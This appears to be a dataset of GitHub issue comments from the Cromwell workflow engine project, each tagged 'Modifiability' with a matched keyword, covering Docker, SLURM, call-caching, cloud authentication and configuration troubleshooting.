Modifiability,"I don't think we override the entrypoint that's correct. If you're using a ""ConfigBackend"" technically you can choose what the docker command is so you could do something like ; ```; submit-docker = """"""; docker run \; --rm -i \; ${""--user "" + docker_user} \; --entrypoint /bin/bash \; -v ${cwd}:${docker_cwd} \; ${docker} \; /bin/bash ${script}; """"""; ```. And in your WDL command call whatever the original entrypoint of your docker was (`/opt/FastQC/wrapper.sh` in your case).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2256#issuecomment-300922007:76,Config,ConfigBackend,76,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2256#issuecomment-300922007,1,['Config'],['ConfigBackend']
Modifiability,"I encountered a need for this improvement while developing WDLs intended for FireCloud. Cromwell support for optional Docker runtimes would enable me to write FireCloud WDLs with quicker development iterations. It would also enable faster and more resilient automated testing (i.e., unit testing) of such WDLs. My current approach to developing WDLs intended for FireCloud is to add Cromwell and my WDL (`foo.wdl`) into the Docker image that contains my workflow dependencies (e.g. Python and R code). ; Then, from my local machine, I execute in my Docker container an equivalent version of my FireCloud WDL with a command like `docker exec $containerId java -jar cromwell-36.1.jar run foo_test.wdl --inputs test_inputs.json --options options.json`. Without a way to override the `runtime` attribute (or ignore its `docker` key) in `foo.wdl`, I resort to commenting out the attribute and copying the content to `foo_test.wdl`. This enables fast development and unit testing, but requires manually syncing `foo.wdl` and `foo_test.wdl`. That, of course, has poor maintainability -- my approach is a kludge. Adam (@aednichols) and I investigated better ways to do this, but found none. [See Slack](https://broadinstitute.slack.com/archives/CA2URMDPX/p1551723156019500) for more details about my issue. In summary, as an engineer using Cromwell to develop and test FireCloud WDLs, support for optional Docker runtimes as proposed here strikes me as the best option for my use case.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1832#issuecomment-469426941:1061,maintainab,maintainability,1061,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1832#issuecomment-469426941,1,['maintainab'],['maintainability']
Modifiability,I explored `rewriteBatchedStatements` as per https://github.com/slick/slick/issues/1272 as I thought this might be the magic we're supposed to ask @dvoet about. It didn't seem to have an effect but there could be some combination of operator error and our slick code confounding this. I did note that Rawls is only using this in their test `reference.conf` so perhaps this isn't what he was talking about. I'll also note one of the last comments in that issue states that it munges the return count. I didn't look but I wouldn't be surprised if we have code checking the # of inserted entries.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1582#issuecomment-269833846:12,rewrite,rewriteBatchedStatements,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1582#issuecomment-269833846,1,['rewrite'],['rewriteBatchedStatements']
Modifiability,"I figured it might be useful information for you since geoffjentry had asked us to share with you how we had configured this before. If it's not, please excuse the spam :sweat_smile:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-438700313:109,config,configured,109,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-438700313,1,['config'],['configured']
Modifiability,"I finally found the issue. The issue was we have an input parameter defined as File object and one of our outputs was using that File object. ```; output {; File twice_filtered_vcf = ""${output_vcf}""; File twice_filtered_vcf_index = ""${output_vcf_index}""; File twice_filtered_pre_adapter_matrix = ""${pre_adapter_matrix}"" <<=== defined as File object; }; ```; Changing it to use the String variable fixed the problem. This issue can be closed out.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4356#issuecomment-439488574:388,variab,variable,388,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4356#issuecomment-439488574,1,['variab'],['variable']
Modifiability,"I find 18 occurrences. `./backend/src/main/scala/cromwell/backend/ExecutionHash.scala: // TODO: PBE: ideally hashes should be deterministic; ./backend/src/test/scala/cromwell/backend/caching/CachingConfigSpec.scala:// TODO PBE Adapt to how new caching works, but the test logic should not need much change; ./database/src/test/scala/cromwell/database/slick/SlickDatabaseSpec.scala: // TODO PBE get rid of this after the migration of #789 has run.; ./engine/src/main/scala/cromwell/engine/workflow/WorkflowActor.scala: // TODO PBE Is this the right place for startTime ?; ./engine/src/main/scala/cromwell/engine/workflow/WorkflowActor.scala: // TODO: PBE: some of the x-es have an actually execution & output stores.; ./engine/src/main/scala/cromwell/engine/workflow/WorkflowManagerActor.scala: // TODO PBE Restart: to be verified after restart is implemented but these WorkflowSucceededResponse/WorkflowFailedResponse seem useless; ./engine/src/main/scala/cromwell/webservice/CromwellApiService.scala: // TODO: PBE: Certainly want to do something for this! But probably not to the WMA; ./engine/src/test/scala/cromwell/engine/workflow/MaterializeWorkflowDescriptorActorSpec.scala: // TODO PBE: this should be done by MWDA (ticket #1076); ./engine/src/test/scala/cromwell/engine/workflow/MaterializeWorkflowDescriptorActorSpec.scala: // TODO: PBE: Re-enable (ticket #1063); ./engine/src/test/scala/cromwell/engine/WorkflowManagerActorSpec.scala: // TODO PBE: Restart workflows tests: re-add (but somewhere else?) in 0.21; ./project/Settings.scala: //""-deprecation"", // TODO: PBE: Re-enable deprecation warnings; ./services/src/main/scala/cromwell/services/metadata/MetadataService.scala: /* TODO: PBE: No MetadataServiceActor.props until circular dependencies fixed.; ./supportedBackends/jes/src/main/scala/cromwell/backend/impl/jes/JesAsyncBackendJobExecutionActor.scala: // TODO: PBE: Trace callers of ""new CallContext()"". Seems to be multiple places in JES, etc. For now:; ./supportedBackends/jes/sr",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1221#issuecomment-240175479:227,Adapt,Adapt,227,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1221#issuecomment-240175479,1,['Adapt'],['Adapt']
Modifiability,"I find that the wrapper bash script (...`/execution/script`) that Cromwell generates tries to capture stdout and stderr in a convoluted way:; - it redirects the command's stdout (and stderr, separately) to a named pipe (a.k.a. FIFO); - it than captures the results from the FIFO, and uses `tee` to make a copy to .../execution/stdout (and stderr, respectively); - it doesn't do anything to the stdout of `tee`. So, `tee` writes another copy to it's own stdout.; - SLURM captures `tee`'s stdout (inherited from the parent script) and writes it to ...`/execution/stdout`. Similary for stderr. So, both copies generated by ""tee"" end up in ...`/exection/stdout`! The output is *duplicated*! This causes problems with subsequent steps in the WDL script. To work around this, I've changed the `-o` and `-e` options to:; ```; -o ${out}.slurm -e ${err}.slurm; ```; noting that `${out}` has the same value as `${cwd}/execution/stdout` in my environment.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5932#issuecomment-1301571393:495,inherit,inherited,495,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5932#issuecomment-1301571393,1,['inherit'],['inherited']
Modifiability,"I fixed the regex. It turned out that this also fixed any issues. > Thanks for finding and fixing this!. Thank you for trusting me with push access on this repository. It makes it easier for me as all tests run immediately, also the tests that need private variables. Also I can restart jobs on travis now that looks like they are failed due to some intermittent connection error. I had to restart one for this PR, and it indeed turned green on the retry. This makes it easier for me to fix any bugs I find. The trust is much appreciated.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5437#issuecomment-594475836:257,variab,variables,257,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5437#issuecomment-594475836,1,['variab'],['variables']
Modifiability,"I found the config file in this link [cromwell.examples.conf](https://github.com/broadinstitute/cromwell/blob/develop/cromwell.example.backends/cromwell.examples.conf);. **BUT** when I set the `concurrent-job-limit = 2`, and run with `-Dconfig.file=cromwell.conf`，in `local` mode，but cromwell still forks **8** job, it seems the limit not working",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5359#issuecomment-575139656:12,config,config,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5359#issuecomment-575139656,1,['config'],['config']
Modifiability,"I fully agree Vanessa!!! I don't think this is surrendering, it's finding; the solution that has been standing in plain sight all the time. At some point in the future Singularity could have a role as a backend for; workflow systems, but it's ineffective to take that idea as a starting; point. I really agree that it's best to lay that idea to rest and focus on; the biggest impact / low hanging fruit . To be honest, Singularity as a workflow componetn is exactly the way I've; been using Singularity in real life, whereas the idea to use it as a; workflow backbone always remained ... just an idea. This is not because; Singularity lacks potential there, but mostly because workflow backbones; have complex requirements, and trying to fit a new tool to them that wasn't; made for it in the first place is not trivial. Moving Singularity out of the role of the backend and into the role of a; workflow component, more specifically a container that understands its; data, also introduces the room to give it its own subfunctions, variables,; metadata, tags, etc. This makes the starting point plainly obvious. You can just take the; location where you mention the location of the executable, and put the; wrapper to your singularity image there. I bet this is what most people do; anyway. A next step would be to give it its own section within the workflow; components. Maybe the comment of oneillkza is a high impact one, just; define Singularity as a CAP/ISOblablabla compliant workflow component; within Cromwell. Another take (and not per se mutually exclusive from the take mentioned; above) would be to, again, fix Singularity as a workflow component, and; create a set of options and functions around it that focus on abstraction; of data access etcetera. Very curious where this will go, and thanks so much Vanessa for rethinking; the approach!. Gr. Pim. On Tue, Aug 28, 2018 at 3:12 AM Vanessa Sochat <notifications@github.com>; wrote:. > Hey everyone!; >; > I've been thinking more about th",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-441126046:1031,variab,variables,1031,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-441126046,1,['variab'],['variables']
Modifiability,"I gave your travis test a nudge since I don't think it's your fault that that specific test case failed. I don't know where circle CI came from, but since the error is ""there's no configuration"" I think it's safe to ignore that one too",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-754102027:180,config,configuration,180,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-754102027,1,['config'],['configuration']
Modifiability,"I got it working now by setting the service-account in `google.conf`. Excellent, thanks for your help!. I was looking into the wrong place: I didn't realize that Cromwell did not find the account at all, I thought it just had a problem with access rights. ----. To answers to your questions, I had set the environment variable; `export GOOGLE_APPLICATION_CREDENTIALS=/Users/jwilppu/cromwell/project-test1-59b66448c3ab.json`; by following these instructions https://cromwell.readthedocs.io/en/develop/tutorials/PipelinesApi101/ which has a link to this page https://cloud.google.com/docs/authentication/production . The result of command `gcloud auth list` is; ```; Credentialed Accounts; ACTIVE ACCOUNT; * juha.wilppu@gmail.com. To set the active account, run:; $ gcloud config set account `ACCOUNT`; ```. I have now removed the environment variable.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3690#issuecomment-392432321:318,variab,variable,318,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3690#issuecomment-392432321,3,"['config', 'variab']","['config', 'variable']"
Modifiability,"I got my first aws.conf from somewhere, don't remember exactly, but I think it was from the AWS team, possibly from some version of their cloudformation template, and it had this in it:. ```; // diff 1:; # region = ""us-west-2"" // uses region from ~/.aws/config set by aws configure command,; # // or us-east-1 by default; ```. If that''s correct, it means that cromwell _should_ be looking in `~/.aws/config`, but maybe it's not correct. Or it is but Cromwell is not picking up the region somehow. So `zones` is supposed to go in the WDL? Something like this?. ```; runtime {; docker: ""ubuntu:latest""; zones: ""us-west-2""; }; ```. ?. Is there an example documented somewhere?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4974#issuecomment-493264033:254,config,config,254,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4974#issuecomment-493264033,3,['config'],"['config', 'configure']"
Modifiability,I guess one way to test this that would go with the grain of the conventional release process would be to create a config option that's disabled by default and selectively enable it on alpha on-instance for testing. It could be removed once we're confident it works in prod. (I fully own that I have questioned the value of config options in the past; I think this is a bit different because it's designed to be temporary.),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5125#issuecomment-526285440:115,config,config,115,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5125#issuecomment-526285440,2,['config'],['config']
Modifiability,"I had the same issue. I got the same error message:; ```; [2020-07-27 18:34:00,37] [error] PipelinesApiAsyncBackendJobExecutionActor [3d2d7a27wf_hello.hello:NA:1]: Error attempting to Execute; cromwell.engine.io.IoAttempts$EnhancedCromwellIoException: [Attempted 1 time(s)] - StorageException: xxx@xxx.iam.gserviceaccount.com does not have serviceusage.services.use access to the Google Cloud project.; Caused by: com.google.cloud.storage.StorageException: xxx@xxx.iam.gserviceaccount.com does not have serviceusage.services.use access to the Google Cloud project.; ```; I had set up my credentials with:; ```; export GOOGLE_APPLICATION_CREDENTIALS=sa.json; ```; and had this configuration in `google.conf` copied from the [tutorial](https://cromwell.readthedocs.io/en/stable/tutorials/PipelinesApi101/):; ```; google {; application-name = ""cromwell""; auths = [; {; name = ""application-default""; scheme = ""application_default""; }; ]; }. engine {; filesystems {; gcs {; auth = ""application-default""; project = ""xxx""; }; }; }; ```; That clearly did not work. I tried to follow the logic in this post. I followed Horneth suggestion to use `service-account`'s authorization and I took the [auths](https://cromwell.readthedocs.io/en/develop/backends/Google/) configuration and changed `pem-file` to `json-file` in `google.conf` as follows:; ```; google {; application-name = ""cromwell""; auths = [; {; name = ""service_account""; scheme = ""service_account""; service-account-id = ""xxx@xxx.iam.gserviceaccount.com""; json-file = ""sa.json""; }; ]; }. engine {; filesystems {; gcs {; auth = ""service_account""; project = ""xxx""; }; }; }; ```; And I have replaced every other instance of `auth = ""application-default""` with `auth = ""service_account""`. Now when I run Cromwell:; ```; java -Dconfig.file=google.conf -jar cromwell-52.jar run hello.wdl -i hello.inputs; ```; I don't get the error anymore. I do get a different error:; ```; [2020-07-27 22:54:56,48] [info] WorkflowManagerActor Workflow 0fb5e69d-7d70-407e-9",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3690#issuecomment-664753906:223,Enhance,EnhancedCromwellIoException,223,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3690#issuecomment-664753906,2,"['Enhance', 'config']","['EnhancedCromwellIoException', 'configuration']"
Modifiability,"I had the same thought as @breilly2 - we have other classes and traits used in a standard way that people building new backends should consider using. I don't think it makes sense to fully document them here, but it might be helpful to add a note indicating that this universe exists and people may want to explore it. Something like, ""Cromwell has a number of classes that extend these traits and implement common backend patterns, which developers may find useful. For example, see...""",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6581#issuecomment-983736653:374,extend,extend,374,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6581#issuecomment-983736653,1,['extend'],['extend']
Modifiability,"I have adapted @delocalizer's script for an LSF backend: https://github.com/wtsi-hgi/olly-maersk/blob/master/zombie-killer.sh It's currently untested, but it shouldn't be far off from what's required.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-475176014:7,adapt,adapted,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-475176014,1,['adapt'],['adapted']
Modifiability,"I have already changed that setting, as it was causing a different error. my aws.conf:. ```; include required(classpath(""application"")). aws {; application-name = ""cromwell""; auths = [{; name = ""default""; scheme = ""default""; }]; region = ""us-east-1""; }. engine { filesystems { s3 { auth = ""default"" } } }. backend {; default = ""AWSBATCH""; providers {; AWSBATCH {; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; config {; numSubmitAttempts = 3; numCreateDefinitionAttempts = 3; root = ""s3://concr-genomics-results/cromwell-execution""; auth = ""default""; concurrent-job-limit = 16; default-runtime-attributes { queueArn = ""arn:aws:batch:us-east-1:<##########>:job-queue/GenomicsDefaultQueue-<###########>"" }; filesystems { s3 { auth = ""default"" } }; }; }; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-435016997:446,config,config,446,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-435016997,1,['config'],['config']
Modifiability,"I have changed it in my local config, thanks. I should add that this appears to work even for images that do not have user $EUID configured inside the docker, but there could be images that expect the user to be root to function.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2658#issuecomment-333065528:30,config,config,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2658#issuecomment-333065528,2,['config'],"['config', 'configured']"
Modifiability,"I have checked in a new version. Will make a pull request for it soon,. https://github.com/broadinstitute/cromwell/blob/mjs-AWS-config-example-fix/cromwell.example.backends/AWS.conf. On Wed, Sep 16, 2020 at 6:14 AM openbioinfomatics for more people who need; it <notifications@github.com> wrote:. > would you guys update ""cromwell/cromwell.example.backends/AWS.conf""; >; > it seams this file for old version .; >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5857>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EK6P5Z7C4RDBY2BIVDSGCFZTANCNFSM4ROS34OQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5857#issuecomment-693513576:128,config,config-example-fix,128,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5857#issuecomment-693513576,1,['config'],['config-example-fix']
Modifiability,I have come to like configs (https://github.com/kxbmap/configs) but another one I liked using was ficus (https://github.com/iheartradio/ficus). Nothing is going to be a complete replacement for the structure we have built up in lenthall but it should help ease the custom code.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1211#issuecomment-250264649:20,config,configs,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1211#issuecomment-250264649,2,['config'],['configs']
Modifiability,"I have confirmed and worked-around by changing the configuration -o and -e parameters to ; ```; -o ${out}.cromwell; -e ${err}.cromwell; ```; identical duplicated files are now written to the work directory. (Identical except in the case of error, which is when I need these files anyway). My request is to remove the >(tee) lines, but I understand they probably exist to serve some other backend. The ability to turn them off would be appreciated.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3705#issuecomment-393064752:51,config,configuration,51,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3705#issuecomment-393064752,1,['config'],['configuration']
Modifiability,I have just had a run with Cromwell 55 configured with the `cromwell.backend.google.pipelines.v2beta.PipelinesApiLifecycleActorFactory` Google API and which resulted in several `504 Gateway Timeout` errors while attempting to read `rc` and `stdout` output files. Is this something that should be looked into?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5344#issuecomment-760291957:39,config,configured,39,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5344#issuecomment-760291957,1,['config'],['configured']
Modifiability,"I have moved to cromwell v53.1 now. However the caching still doesn't work for me. I consistently get an error like this:. > 2020-11-07 17:54:51,634 cromwell-system-akka.dispatchers.engine-dispatcher-35 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 (EnhancedCromwellIoException: [Attempted 1 time(s)] - RejectedExecutionException: ); > 2020-11-07 17:54:51,635 cromwell-system-akka.dispatchers.engine-dispatcher-35 WARN - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Invalidating cache entry CallCachingEntryId(347) (Cache entry details: Some(7b292def-1477-4450-988a-e01627d61786:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0)); > 2020-11-07 17:54:51,673 cromwell-system-akka.dispatchers.backend-dispatcher-7385 WARN - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-BackendCacheHitCopyingActor-0123c178:GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:-1:1-5 [UUID(0123c178)GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1]: Unrecognized runtime attribute keys: preemptible; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-38 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1 [UUID(0123c178)]: Call cache hit process had 0 total hit failures before completing successfully; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-33 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Could not copy a suitable cache hit for 0123c178:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Fa",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:462,Enhance,EnhancedCromwellIoException,462,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807,1,['Enhance'],['EnhancedCromwellIoException']
Modifiability,"I have not reproduced the issue, I will try when I get a chance here. At the time I was modifying my backend's 'runtime-attributes'. I made all those attributes optional. I also removed all the 'runtime' stanzas in the wdl file I was testing. I believe there was an error in the 'submit' syntax of my backend config. . Is it possible a config file that fails to parse will cause backends to default to the Local backend? I know parts of the config are not parsed until a job is submitted. I will try to isolate the problem. Thanks",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3533#issuecomment-382918043:309,config,config,309,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3533#issuecomment-382918043,3,['config'],['config']
Modifiability,"I have not used this configuration in some time. On Aug 6, 2017 14:39, ""Geraldine Van der Auwera"" <notifications@github.com>; wrote:. @LeeTL1220 <https://github.com/leetl1220> Do you have a reproducible test; case? Otherwise we probably need to close this. —; You are receiving this because you were mentioned.; Reply to this email directly, view it on GitHub; <https://github.com/broadinstitute/cromwell/issues/1895#issuecomment-320524441>,; or mute the thread; <https://github.com/notifications/unsubscribe-auth/ACDXk2gj4A8fOPuWbRAQvNF1k1H9Ct9Aks5sVgh-gaJpZM4LrbMZ>; .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1895#issuecomment-320647147:21,config,configuration,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1895#issuecomment-320647147,1,['config'],['configuration']
Modifiability,"I have run both strategies with a workflow that generates around about 2000 jobs (100 samples) using GATK best practices for RNA variant calling. . ### Method. The Cromwell instance ran with a SLURM cluster backend. All jobs were run using singularity containers. The cromwell process was limited to 3 akka threads and 1 GC thread (by default it grabs al threads on the login node, and this is not fair to other users). The HSQLDB memory database with persistance file was used. Said SLURM cluster has its storage connected via NFS. Two configurations of cromwell were used. One with the xxh64 strategy, and one with the fingerprint strategy. Each cromwell instance was executed in its own directory, with its own database and own cromwell-executions folder. The [BioWDL RNA-seq](https://github.com/biowdl/rna-seq) workflow was run. After running, the workflow was run again to see if the call-caching worked correctly. ### Results; Both `xxh64` and `fingerprint` strategies were able to rerun the workflow with a 100% Cache hit. The fingerprint strategy however was much quicker:; `time` results for fingerprint; ```; real 23m26.269s; user 15m31.229s; sys 2m43.406s; ```; `time` results for xxh64; ```; real 69m12.478s; user 56m7.371s; sys 52m6.262s; ```. ### Conclusion; Using xxh64 as a strategy requires some calculation but one hour for 100 samples on 2000 jobs is quite acceptable. What is obvious is that the system IO (`sys` time) takes a lot of time as well. This cluster has very fast optimized ISILON storage, but on clusters without this, any hashing strategy can be quite slow because of this. The fingerprint works very well for HPC environments.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-601604438:537,config,configurations,537,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-601604438,1,['config'],['configurations']
Modifiability,"I have some config-parsing code that appears to work but is too gross to push, I'll see if I can clean it up.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4864#issuecomment-486896880:12,config,config-parsing,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4864#issuecomment-486896880,1,['config'],['config-parsing']
Modifiability,"I have the exact same issue. First of all, both the [Configuration examples](https://cromwell.readthedocs.io/en/stable/Configuring/#configuration-examples) and [Local](https://cromwell.readthedocs.io/en/stable/backends/Local/) sections of the documentation point to non-existing file https://github.com/broadinstitute/cromwell/tree/develop/cromwell.examples.conf while they should point to https://github.com/broadinstitute/cromwell/blob/develop/cromwell.example.backends/cromwell.examples.conf like lozybean pointed out. This is still not fixed in the documentation. But then I have downloaded the [cromwell.examples.conf](https://raw.githubusercontent.com/broadinstitute/cromwell/develop/cromwell.example.backends/cromwell.examples.conf) file and used it as follows:; ```; wget https://raw.githubusercontent.com/broadinstitute/cromwell/develop/cromwell.example.backends/cromwell.examples.conf; sed -i 's/#concurrent-job-limit = 5/concurrent-job-limit = 5/' cromwell.examples.conf; java -Dconfig.file=cromwell.examples.conf -jar cromwell-51.jar run ...; ```. And Cromwell on my laptop still spawned 23 job tasks simultaneously. What do I have to do to limit the number of concurrent jobs? This would be very convenient for me to be able to speed up development of my own WDL. Thank you!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5359#issuecomment-649697302:53,Config,Configuration,53,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5359#issuecomment-649697302,3,"['Config', 'config']","['Configuration', 'Configuring', 'configuration-examples']"
Modifiability,"I have to note that I didn't make this configuration (@rhpvorderman will know more about this); This is in the backend section:; ```; caching {; duplication-strategy: [ ""soft-link"", ""copy"", ""hard-link"" ]; hashing-strategy: ""file""; }; ```; This is on the top level:; ```; call-caching {; enabled = true; invalidate-bad-cache-results = true; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3717#issuecomment-393886848:39,config,configuration,39,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3717#issuecomment-393886848,1,['config'],['configuration']
Modifiability,"I have validated that the log file for each submitted workflow does not get closed when Cromwell is run in server mode and is configured with `workflow-log-temporary: false` and the workflow does not specify the `final_workflow_log_dir` option. I also have tested that Tony's fix above resolves the problem. While using a workflow options file is a workaround, it's not a general solution for debugging failed workflows submitted by users who did not include the options file to begin with. Even worse, the bug results in a file handle leak in Cromwell server. . Repro steps:. ```; # cromwell.conf; include required(classpath(""application"")); workflow-options {; # When true, per workflow logs will be deleted after copying; workflow-log-temporary: false; }; ```. Run: `java -Dconfig.file=cromwell.conf -jar cromwell.jar server` . Submit a simple Hello World .wdl file to /api/workflows (submit a couple times see the leak). We see that many log file handles remain unclosed:; `sudo lsof -p $(pidof java)`. ```; java 33951 cromwellbuild 33w REG 8,1 117 533080 /home/cromwellbuild/cromwell/cromwell-workflow-logs/workflow.11dbb9e7-10e3-48dc-b36f-0b7e35941ce3.log; java 33951 cromwellbuild 34w REG 8,1 1301 525688 /home/cromwellbuild/cromwell/cromwell-workflow-logs/workflow.0ed80fab-afd1-4783-9b27-409b75f0f2f7.log; java 33951 cromwellbuild 35w REG 8,1 117 533081 /home/cromwellbuild/cromwell/cromwell-workflow-logs/workflow.ef428f60-f8c3-4456-a3ea-bea63486881a.log; java 33951 cromwellbuild 36w REG 8,1 117 533085 /home/cromwellbuild/cromwell/cromwell-workflow-logs/workflow.4df4069e-0ef0-43ba-8bfb-37413d7ed229.log; java 33951 cromwellbuild 37w REG 8,1 117 533086 /home/cromwellbuild/cromwell/cromwell-workflow-logs/workflow.48e5c4ff-c067-465d-820b-2b41cb74ef31.log; java 33951 cromwellbuild 38w REG 8,1 117 533087 /home/cromwellbuild/cromwell/cromwell-workflow-logs/workflow.05bcd5a7-3924-4ba0-ab39-57bc09716abb.log; java 33951 cromwellbuild 39w REG 8,1 117 533088 /home/cromwellbuild/cromwell/cromw",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4826#issuecomment-499023273:126,config,configured,126,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4826#issuecomment-499023273,1,['config'],['configured']
